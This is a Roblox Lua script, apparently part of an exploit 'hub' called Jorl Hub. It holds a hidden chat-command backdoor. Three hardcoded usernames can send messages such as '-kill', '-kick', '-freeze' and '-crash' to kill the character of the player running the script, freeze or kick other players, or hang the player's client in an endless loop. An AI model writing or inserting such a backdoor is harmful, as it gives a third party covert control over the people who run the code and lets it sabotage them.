local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")
local RunService = game:GetService("RunService")

local Usernames = {
    "RizzardOfTheNorth",
    "Roblox",
    "Nobody"
}

local Frozen = {}
local CommandAllowed = true

local function freezePlayer(plr)
    if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
        plr.Character.HumanoidRootPart.Anchored = true
        Frozen[plr.Name] = true
    end
end

local function thawPlayer(plr)
    if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
        plr.Character.HumanoidRootPart.Anchored = false
        Frozen[plr.Name] = nil
    end
end

local function crashPlayer(plr)
    if CommandAllowed and plr == LocalPlayer then
        task.spawn(function()
            while true do
                print("crashed by owner of jorl hub")
            end
        end)
    end
end

local function onMessage(message, speaker)
    for _, name in ipairs(Usernames) do
        if speaker == name then
            local cmd, targetName = message:match("%-(%w+)%s+(%S+)")
            if cmd and targetName then
                local target = Players:FindFirstChild(targetName)
                if not target then return end
                if cmd == "kill" and target == LocalPlayer then
                    Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
                    print("Killed by command from "..speaker)
                elseif cmd == "kick" then
                    if target ~= LocalPlayer then
                        target:Kick("Kicked By The Owner Of Jorl Hub")
                        target.Parent = nil
                    end
                elseif cmd == "freeze" then
                    freezePlayer(target)
                elseif cmd == "thaw" then
                    thawPlayer(target)
                elseif cmd == "crash" then
                    crashPlayer(target)
                end
            end
        end
    end
end

for _, plr in ipairs(Players:GetPlayers()) do
    plr.Chatted:Connect(function(msg)
        onMessage(msg, plr.Name)
    end)
end

Players.PlayerAdded:Connect(function(plr)
    plr.Chatted:Connect(function(msg)
        onMessage(msg, plr.Name)
    end)
    plr.CharacterAdded:Connect(function(char)
        if Frozen[plr.Name] then
            task.wait(0.1)
            freezePlayer(plr)
        end
    end)
end)

for _, plr in ipairs(Players:GetPlayers()) do
    plr.CharacterAdded:Connect(function(char)
        if Frozen[plr.Name] then
            task.wait(0.1)
            freezePlayer(plr)
        end
    end)
end
